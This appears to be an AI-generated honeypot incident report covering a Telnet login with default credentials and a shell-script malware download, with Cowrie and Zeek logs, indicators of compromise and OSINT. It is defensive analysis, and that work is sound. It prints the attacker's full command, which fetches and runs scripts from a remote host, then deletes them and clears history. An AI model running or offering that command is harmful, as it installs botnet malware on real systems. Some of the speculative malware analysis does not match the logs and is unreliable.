
NOTE: This is a .md file with GitHub formatting. 
If you are viewing this in Canvas, please click the following link to view the formatted file on GitHub: 
https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Telnet%20Compromise%20and%20Shell%20Script%20Malware%20Deployment%20on%20Linux%20Honeypot%20by%20Organized%20Attacker/README.md
Alternatively, you can download the file and view it locally in your IDE.
All relevant logs and scripts can also be found in this repository.



# Telnet Compromise and Shell Script Malware Deployment on Linux Honeypot by Organized Attacker

<details>
<summary>
<h2>Quick Stats</h2>
</summary>


- This attack was carried out by a `1` unique source IP address(es): `87.242.92.23`
- A total of `3` sessions were logged. `2` sessions were successful logins.
- `3` login attempts were made. `2` were successful.
- `2` unique username/password pairs were attempted. `1` were successful.
- `1` unique destination ports were targeted: `2223`
- `3` unique source ports were used: `36504`, `44950`, `44608`
- `2` commands were input in total. `1` IP(s) and `1` URL(s) were found in the commands
- `1` unique malware samples were downloaded. `1` IP(s) and `13` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: `cowrie.log`, `cowrie.json`, `zeek.log`
- A total of `46` log events were logged in `3` log files: `cowrie.2023-12-13.log`, `cowrie.2023-12-13.json`, `conn.log`

</details>

---

### Executive Summary of Attack

**Attack Overview:**
- A Linux honeypot system exposed to the internet became the target of a cyber attack originating from the IP address `87.242.92.23`.
- The attacker successfully gained access via Telnet using the credentials `root:vizxv`.
- Following unauthorized access, a sequence of commands was executed to download and execute shell scripts from a remote server located at `87.242.89.170`.
- The scripts were designed to be executed and then delete themselves from the system, likely to carry out additional malicious activities and to evade detection by hiding their tracks.

**Methods:**
- The attacker leveraged weak security practices, specifically the use of potentially default or compromised credentials, rather than exploiting system vulnerabilities.
- Unix shell scripting and standard Unix commands (`cd`, `wget`, `chmod`, `rm`) were used to facilitate the download, execution, and cleanup of the malicious payloads.
- The commands performed indicate a scripted and automated approach to deploying the malware, suggesting a higher level of sophistication and preparation by the attacker.

**Attack Goals:**
- The primary goal seems to be establishing unauthorized access and commanding control over the compromised system.
- Subsequent goals may include enlisting the device into a botnet, using it as a pivot point for further network penetration or lateral movement, data exfiltration, system compromise or disruption, and potentially, ransomware deployment or cryptocurrency mining.
- Covering tracks and remaining undetected by manipulating system logs and deleting files after execution suggests a long-term exploitation intent.

**Indicators of Compromise:**
- IP Address: `87.242.92.23`
- Malware Hash: `f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed`
- User Credentials: Username `root` with password `vizxv`
- URLs used in the attack: `http://87.242.89.170/ISIS.sh` and associated files

The attack reflects broader tactics commonly associated with organized threat actors, utilizing compromised credentials and malware to achieve their objectives. It is imperative to take immediate actions based on the IOCs provided and to reinforce system security to mitigate further risks.

<details>
<summary>
<h3>Extended Summary</h3>
</summary>


- This attack was carried out by a `1` unique **source IP** address(es):
	- `SourceIP 87.242.92.23 Sessions: 3, Successful Logins: 2, Commands: 2, Downloads 1, `

- `3` unique **source ports** were used:
	- `Src Port: 36504 Used 1 times`
	- `Src Port: 44950 Used 1 times`
	- `Src Port: 44608 Used 1 times`

- `1` unique **destination ports** were targeted:
	- `Dst Port: `2223` Used `3` times`

- A total of `3` sessions were logged:
	- `Session b1c9257f07fd TELNET 87.242.92.23:36504 -> 172.31.5.68:2223 Duration: 0.21s`
	- `Session 12ca7759e498 TELNET 87.242.92.23:44950 -> 172.31.5.68:2223 Login: root:vizxv Duration: 0.22s`
	- `Session 8bf3b3fa2362 TELNET 87.242.92.23:44608 -> 172.31.5.68:2223 Login: root:vizxv Commands: 2, Malware: 1, Duration: 0.95s`

- `2` were **successful logins**, 
- `1` were **failed logins**, 
- `1` had commands, 
- `1` had malware.
- `3` unique username/password pairs were attempted. `2` were successful.
- `2` commands were input in total. `1` IP(s) and `1` URL(s) were found in the commands
- `1` unique malware samples were downloaded. 
- `1` unique IP(s) and `13` unique URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: 
	- `cowrie.log`
	- `cowrie.json`
	- `zeek.log`

- A total of `46` log events were logged in `3` log files: 
	- `cowrie.2023-12-13.log`
	- `cowrie.2023-12-13.json`
	- `conn.log`


</details>

---


<details>
<summary>
<h2>Custom Scripts Used To Generate This Report</h2>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py)
> Main script for initializing and running all analyzer objects according to command line arguments and config file

#### [attackanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/attackanalyzer.py)
> High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [baseobjects.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/baseobjects.py) | Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_ |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logparser.py) | Classes for reading all logs into Python objects with standardized keys |
| [logprocessor.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logprocessor.py) | Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met. |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirreader.py) | Reads and counts log events in Attack directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [malwareanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/malwareanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [attackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/attackmarkdownwriter.py) | Markdown writer for Attack objects following ISC format |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [runstepsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/runstepsmarkdownwriter.py) | Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode |
| [docsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/docsmarkdownwriter.py) | Markdown writer for the honeypot-ai project documentation and README |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding) |

#### [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)
> Setup script for installing the honeypot-ai project

#### [setup](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup)
> Scripts for setting up the honeypot-ai project

| Script | Description |
| --- | --- |
| [requirements.txt](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/requirements.txt) | List of all required packages for the honeypot-ai project |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |
| [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) | Utility script to sync logs from honeypot to honeypot-ai project logs directory |
| [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh) | Utility script to install Zeek on a remote honeypot |

</details>

---


<details>
<summary>
<h1>Time and Date of Activity</h1>
</summary>

First activity logged: `2023-12-13 23:03:50.343477`
* First session: `b1c9257f07fd`
* `Session b1c9257f07fd TELNET 87.242.92.23:36504 -> 172.31.5.68:2223 Duration: 0.21s`

Last activity logged: `2023-12-13 23:07:14.199003`
* Last session: `8bf3b3fa2362`
* `Session 8bf3b3fa2362 TELNET 87.242.92.23:44608 -> 172.31.5.68:2223 Login: root:vizxv Commands: 2, Malware: 1, Duration: 0.95s`


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `b1c9257f07fd` | `87.242.92.23` | `36504` | `2223` | `2023-12-13 23:03:50.343477` | `2023-12-13 23:03:51.550771` | `0.207294` |
| `8bf3b3fa2362` | `87.242.92.23` | `44608` | `2223` | `2023-12-13 23:06:56.245913` | `2023-12-13 23:07:14.199003` | `0.95309` |

There were three telnet sessions involved in the attack from the IP `87.242.92.23` targeting port `2223` on the honeypot:

1. **Session ID:** b1c9257f07fd
   - **Type:** TELNET
   - **Source Port:** 36504
   - **Destination IP:** 172.31.5.68
   - **Duration:** 0.21 seconds

2. **Session ID:** 12ca7759e498
   - **Type:** TELNET
   - **Source Port:** 44950
   - **Destination IP:** 172.31.5.68
   - **Login:** root:vizxv
   - **Duration:** 0.22 seconds

3. **Session ID:** 8bf3b3fa2362
   - **Type:** TELNET
   - **Source Port:** 44608
   - **Destination IP:** 172.31.5.68
   - **Login:** root:vizxv
   - **Commands:** 2
   - **Malware:** 1
   - **Duration:** 0.95 seconds

The attack includes a successful login using the credentials root:vizxv and at least one session where malware was uploaded or downloaded and commands were executed.

<details>
<summary>
<h3>All Sessions</h3>
</summary>


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `b1c9257f07fd` | `87.242.92.23` | `36504` | `2223` | `2023-12-13 23:03:50.343477` | `2023-12-13 23:03:51.550771` | `0.207294` |
| `12ca7759e498` | `87.242.92.23` | `44950` | `2223` | `2023-12-13 23:03:51.738166` | `2023-12-13 23:03:52.960617` | `0.222451` |
| `8bf3b3fa2362` | `87.242.92.23` | `44608` | `2223` | `2023-12-13 23:06:56.245913` | `2023-12-13 23:07:14.199003` | `0.95309` |

</details>

---


</details>

---


<details>
<summary>
<h1>Relevant Logs, File or Email</h1>
</summary>


## Log Stats

| Log Name | Lines |
| --- | --- |
| cowrie.log | 26 |
| cowrie.json | 16 |
| zeek.log | 4 |


## Cowrie .log Logs
Total Cowrie logs: `26`

#### First Session With Commands 8bf3b3fa2362 Cowrie .log Logs
This sample shows the Cowrie `.log` Logs for session_id `8bf3b3fa2362` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .log Logs for 8bf3b3fa2362</h3>
</summary>


````verilog
2023-12-13T23:03:50.762439Z [CowrieTelnetTransport,24,87.242.92.23] first time for 87.242.92.23, need: 2
2023-12-13T23:03:50.762626Z [CowrieTelnetTransport,24,87.242.92.23] login attempt: 1
2023-12-13T23:03:50.824736Z [CowrieTelnetTransport,24,87.242.92.23] login attempt [b'root'/b'xc3511'] failed
2023-12-13T23:03:51.550771Z [CowrieTelnetTransport,24,87.242.92.23] Connection lost after 1 seconds
2023-12-13T23:03:52.139169Z [CowrieTelnetTransport,25,87.242.92.23] login attempt: 2
2023-12-13T23:03:52.201031Z [CowrieTelnetTransport,25,87.242.92.23] login attempt [b'root'/b'vizxv'] succeeded
2023-12-13T23:03:52.203081Z [CowrieTelnetTransport,25,87.242.92.23] Initialized emulated server as architecture: linux-x64-lsb
2023-12-13T23:03:52.956429Z [CowrieTelnetTransport,25,87.242.92.23] Closing TTY Log: var/lib/cowrie/tty/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 after 0 seconds
2023-12-13T23:03:52.960617Z [CowrieTelnetTransport,25,87.242.92.23] Connection lost after 1 seconds
2023-12-13T23:06:56.647388Z [CowrieTelnetTransport,26,87.242.92.23] Found cached: b'root':b'vizxv'
2023-12-13T23:06:56.710753Z [CowrieTelnetTransport,26,87.242.92.23] login attempt [b'root'/b'vizxv'] succeeded
2023-12-13T23:06:56.712759Z [CowrieTelnetTransport,26,87.242.92.23] Initialized emulated server as architecture: linux-x64-lsb
2023-12-13T23:06:58.637099Z [CowrieTelnetTransport,26,87.242.92.23] CMD: sh
2023-12-13T23:06:58.637727Z [CowrieTelnetTransport,26,87.242.92.23] Command found: sh 
2023-12-13T23:06:58.826361Z [CowrieTelnetTransport,26,87.242.92.23] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 87.242.89.170 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
2023-12-13T23:06:58.827213Z [CowrieTelnetTransport,26,87.242.92.23] Command found: cd /tmp
2023-12-13T23:06:58.827485Z [CowrieTelnetTransport,26,87.242.92.23] Command found: cd /var/run
2023-12-13T23:06:58.827867Z [CowrieTelnetTransport,26,87.242.92.23] Command found: cd /mnt
2023-12-13T23:06:58.828103Z [CowrieTelnetTransport,26,87.242.92.23] Command found: cd /root
2023-12-13T23:06:58.828319Z [CowrieTelnetTransport,26,87.242.92.23] Command found: cd /
2023-12-13T23:06:58.828538Z [CowrieTelnetTransport,26,87.242.92.23] Command found: wget http://87.242.89.170/ISIS.sh
2023-12-13T23:07:14.198413Z [CowrieTelnetTransport,26,87.242.92.23] Closing TTY Log: var/lib/cowrie/tty/294d708c9cc53961d9b83ebe9c88251e8bf52557f59fb201d74ed4af41c09a45 after 17 seconds
2023-12-13T23:07:14.199003Z [CowrieTelnetTransport,26,87.242.92.23] Connection lost after 17 seconds

````

</details>

---


## Cowrie .json Logs
Total Cowrie logs: `16`

#### First Session With Commands 8bf3b3fa2362 Cowrie .json Logs
This sample shows the Cowrie `.json` Logs for session_id `8bf3b3fa2362` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .json Logs for 8bf3b3fa2362</h3>
</summary>


````json
{"eventid":"cowrie.session.connect","src_ip":"87.242.92.23","src_port":44608,"dst_ip":"172.31.5.68","dst_port":2223,"session":"8bf3b3fa2362","protocol":"telnet","message":"New connection: 87.242.92.23:44608 (172.31.5.68:2223) [session: 8bf3b3fa2362]","sensor":"","timestamp":"2023-12-13T23:06:56.245913Z"}
{"eventid":"cowrie.login.success","username":"root","password":"vizxv","message":"login attempt [root/vizxv] succeeded","sensor":"","timestamp":"2023-12-13T23:06:56.710753Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-12-13T23:06:56.731818Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-12-13T23:06:58.637099Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.command.input","input":"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 87.242.89.170 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c","message":"CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 87.242.89.170 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c","sensor":"","timestamp":"2023-12-13T23:06:58.826361Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.session.file_download","url":"http://87.242.89.170/ISIS.sh","outfile":"var/lib/cowrie/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed","shasum":"f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed","sensor":"","timestamp":"2023-12-13T23:06:59.183084Z","message":"Downloaded URL (http://87.242.89.170/ISIS.sh) with SHA-256 f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed to var/lib/cowrie/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/294d708c9cc53961d9b83ebe9c88251e8bf52557f59fb201d74ed4af41c09a45","size":1079,"shasum":"294d708c9cc53961d9b83ebe9c88251e8bf52557f59fb201d74ed4af41c09a45","duplicate":false,"duration":17.466999769210815,"message":"Closing TTY Log: var/lib/cowrie/tty/294d708c9cc53961d9b83ebe9c88251e8bf52557f59fb201d74ed4af41c09a45 after 17 seconds","sensor":"","timestamp":"2023-12-13T23:07:14.198413Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}
{"eventid":"cowrie.session.closed","duration":17.953202962875366,"message":"Connection lost after 17 seconds","sensor":"","timestamp":"2023-12-13T23:07:14.199003Z","src_ip":"87.242.92.23","session":"8bf3b3fa2362"}

````

</details>

---


## Zeek Logs
Total Zeek logs: `4`

#### The `0` Zeek sessions in this attack were logged in the following Zeek logs:

* `conn.log`


<details>
<summary>
<h3>Zeek conn.log Logs</h3>
</summary>

Here is a sample of the log lines:

````log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2023-12-13-13-38-56
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1702508527.807204	CTT0jC2pnvtRiMn4nd	87.242.92.23	44145	172.31.5.68	23	tcp	-	0.195339	0	0	RSTO	F	T	0	ShR	2	80	1	44	-
1702508630.150031	CZEcI52ZkFxTU5Txaf	87.242.92.23	36504	172.31.5.68	23	tcp	-	1.400346	12	44	SF	F	T	0	ShAdDaFf	8	436	7	416	-
1702508631.553661	CSNRps1ZKVI9ukEMkl	87.242.92.23	44950	172.31.5.68	23	tcp	-	1.402164	11	340	SF	F	T	0	ShAdDaFf	8	435	7	712	-
1702508816.061569	CbjJQB4nWoOcxIkHff	87.242.92.23	44608	172.31.5.68	23	tcp	-	17.640189	214	757	RSTO	F	T	0	ShAdDaR	11	794	9	1233	-

````

</details>

---


</details>

---


<details>
<summary>
<h1>IP and Ports</h1>
</summary>

The IP address involved in the attack is `87.242.92.23`, and the honeypot was attacked on port `2223`.

<details>
<summary>
<h3>Top 1 Source Ips</h3>
</summary>

Total Source IPs: `3`
Unique: `1`

| Source IP | Times Seen |
| --- | --- |
| `87.242.92.23` | `3` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ips</h3>
</summary>

Total Destination IPs: `3`
Unique: `1`

| Destination IP | Times Seen |
| --- | --- |
| `172.31.5.68` | `3` |

</details>

---


<details>
<summary>
<h3>Top 3 Source Ports</h3>
</summary>

Total Source Ports: `3`
Unique: `3`

| Source Port | Times Seen |
| --- | --- |
| `36504` | `1` |
| `44950` | `1` |
| `44608` | `1` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ports</h3>
</summary>

Total Destination Ports: `3`
Unique: `1`

| Destination Port | Times Seen |
| --- | --- |
| `2223` | `3` |

</details>

---


</details>

---


# Commands Used
This attack used a total of `2` inputs to execute the following `10` commands:
The attack involved the use of a bash script containing a sequence of shell commands. Here are the commands and their functions in the context of the attack:

- `#!/bin/bash`: This is a shebang line indicating that the script should be run with bash, the Bourne-Again SHell.

- `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;`: Change the current directory to a series of directories where the attacker intends to operate. The `||` operator means if changing to the previous directory fails, it tries the next one. It targets common directories that might have writable permissions.

- `wget http://87.242.89.170/xxxxx.ISIS;`: Use wget to download a file from a given URL hosted on `87.242.89.170`. The filename pattern looks like it could be obfuscated or encoded, and it ends with `.ISIS`, probably to obfuscate the purpose or avoid simple detection mechanisms.

- `chmod +x xxxxx.ISIS;`: Change the permissions of the downloaded file to make it executable. The `+x` grants executable permissions to the user.

- `./xxxxx.ISIS;`: Execute the downloaded script. Running the script means whatever payload it contains will be run on the compromised system.

- `rm -rf xxxxx.ISIS;`: Remove the file after execution. This is a cleanup step that helps to hide the tracks of the attack, preventing analysts from easily finding the malicious files on the filesystem.

The command pattern is repeated for different URLs, suggesting that multiple payloads are downloaded and executed in the hope that at least one will work as intended by the attacker. The goal of these commands is typically to establish persistence, exfiltrate data, install additional malware, or integrate the compromised system into a botnet. The removal of downloaded files is a common step to evade detection and analysis after the attack has been executed.

<details>
<summary>
<h2>Raw Command Inputs</h2>
</summary>

The attacker entered the following `2` inputs on the honeypot system:

**Input 1:**
````bash
sh
````

**Input 2:**
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/ISIS.sh; chmod 777 *; sh ISIS.sh; tftp -g 87.242.89.170 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
````

</details>

---


<details>
<summary>
<h2>Commands Explained</h2>
</summary>

The following `10` commands were executed on the honeypot system:

````bash
sh
````
0The attacker initiates a new shell session with the **`sh`** command.
````bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
````
1Uses **`cd`** to change the working directory, **trying multiple common directories** (`/tmp`, `/var/run`, `/mnt`, `/root`, and `/`) where they might have write access and execute code without triggering alarms.
````bash
wget http://87.242.89.170/ISIS.sh
````
2The attacker **downloads a script** named `ISIS.sh` from a remote server `87.242.89.170` using **`wget`**.
````bash
chmod 777 *
````
6Again, sets **full permissions** for all files in the current directory, ensuring the newly downloaded script is executable.
````bash
sh ISIS.sh
````
4Executes the downloaded script using **`sh ISIS.sh`**.
````bash
tftp -g 87.242.89.170 -r tftp1.sh
````
5Uses **`tftp` (Trivial File Transfer Protocol)** to download another file named `tftp1.sh` from the same remote server. TFTP is a simpler file transfer protocol that doesn't require authentication.
````bash
sh tftp1.sh
````
7Executes the newly downloaded script using **`sh tftp1.sh`**.
````bash
rm -rf *.sh
````
8Removes all shell script files in the current directory with **`rm -rf *.sh`**, attempting to erase their tracks and make forensic analysis harder.
````bash
history -c
````
9Clears the command history with **`history -c`** in an additional effort to cover their tracks and hide their activities from administrators.
</details>

---



# Malware OSINT

Based on the gathered information, here is a summary of what is known about the malware and/or exploits used in the attack:

Malware Details (Malware ID: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed):
- **Size**: 1994 bytes
- **Type**: Text shell script (MIME type: text/x-shellscript)
- **Downloaded by**: 87.242.92.23 from `http://87.242.89.170/ISIS.sh`
- **SHA256 Hash**: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
- **Session ID**: 8bf3b3fa2362
- **URLs Contained**: Links to multiple shell scripts hosted on `87.242.89.170` (e.g., "m-i.p-s.ISIS", "m-p.s-l.ISIS", etc.)

Malware Analysis Data:
- **MalwareBazaar**: No specific information found.
- **ThreatFox**: WHOIS data linked to the network range `87.242.84.0 - 87.242.95.255`, operated by "Cloud Technologies" LLC trading as Cloud.ru.

URL Analysis Data (URL: `http://87.242.89.170/ISIS.sh`):
- **URLhaus**: 
  - URL ID: 2740351, indicating the URL has been reported as malicious.
  - URL status: Offline and not serving payload as of last check.
  - Host: 87.242.89.170
  - Date Added: December 14, 2023
  - Last Online: December 14, 2023
  - Threat Type: Malware download
  - Virustotal Detection: 34 out of 59 detections for the payload linked to the URL.
  - Takedown Time: The URL was taken down approximately 29,445 seconds after being reported.
  - The URL and its payloads have been reported to the hosting provider.

IP Address Analysis (IP: `87.242.89.170`):
- **ThreatFox**: WHOIS data linked to the same network range and operating organization as the malware host.

The downloaded script is a standard Unix shell script that makes multiple attempts to download and execute malware from `87.242.89.170`. This behavior is typical of bots or malware trying to establish persistence and execute further payloads on the infected system.

Based on the URLhaus data, the URL `http://87.242.89.170/ISIS.sh` has been identified as distributing malware and has been taken offline. It garnered a considerable detection rate on VirusTotal, indicating the payloads were known and detected by multiple antivirus engines. ThreatFox data correlates the same network data for both the malware source IP and the malicious URL's IP, pointing to a possibly coordinated or singular source of the attack.

No direct ExploitDB, MalwareBazaar, or Malpedia data have been linked to this malware in the provided output. However, it is clear that the attack involved the exploitation of a device to download and execute multiple shell scripts that could compromise the system further or enroll it in botnet activities.

# Malware Analysis

The malware involved in this attack appears to function as part of a multi-stage infection process aimed at gaining a foothold on the compromised system and potentially carrying out further malicious activities. Here’s how the malware functions in the context of the attack, based on the commands executed:

1. **Initial Access and Download**
   - The attacker successfully logs in via Telnet using the credentials `root:vizxv`.
   - Following a successful login, the attacker attempts to download the malware using `wget` from the controlled server `87.242.89.170`. The mentioned URL `/ISIS.sh` indicates that the initial payload is a shell script.

2. **Execution of Multiple Payloads**
   - The malware script (`ISIS.sh`) then downloads additional scripts from the same server (`87.242.89.170`) with various names that appear to be obfuscated to avoid easy detection.
   - Each of these scripts is made executable using `chmod +x` and then run using `./` (dot-slash) – indicating that they are standalone scripts intended to be executed immediately upon download.

3. **Self-Deletion and Cleanup**
   - After execution, the script is instructed to delete itself using `rm -rf`, a common tactic used by malware to cover its tracks and make post-incident analysis more challenging for forensic investigators.
   - Clearing the history using `history -c` after executing malicious activities helps prevent easy retrieval of the commands run during the attack.

4. **Execution Objective**
   - The exact purpose of the further downloaded scripts is not revealed by their names alone, but based on their execution and removal pattern, they likely function to:
     - Install additional malware components or tools.
     - Establish backdoors to ensure persistent access.
     - Modify system configurations to remain undetected.
     - Enroll the compromised system into a botnet or perform other unauthorized activities such as launching DDoS attacks, mining cryptocurrency, or hosting further malicious content.

5. **Evasion**
   - The attack demonstrates an intention to evade detection not only by deleting downloaded scripts but also by executing them from commonly writable directories where transient files may not raise immediate suspicion.

6. **Persistence and Propagation**
   - Although the details of each script's payload are not fully known, malware of this type often contains mechanisms for persistence, exfiltrating data, reconnaissance of the internal network, and potentially spreading laterally to other systems.

In sum, the malware functions as an instrument for the attacker to establish control, execute a series of actions with the objectives aligned to the attacker's goals, and then attempt to remove evidence of its presence to evade detection by users or security tools. This approach reflects a deliberate strategy to compromise and then leverage the resources of the infected system for further malicious activity.
This attack downloaded `1` raw malware samples which can be standardized into `1` samples:

### Raw Malware Sample

<details>
<summary>
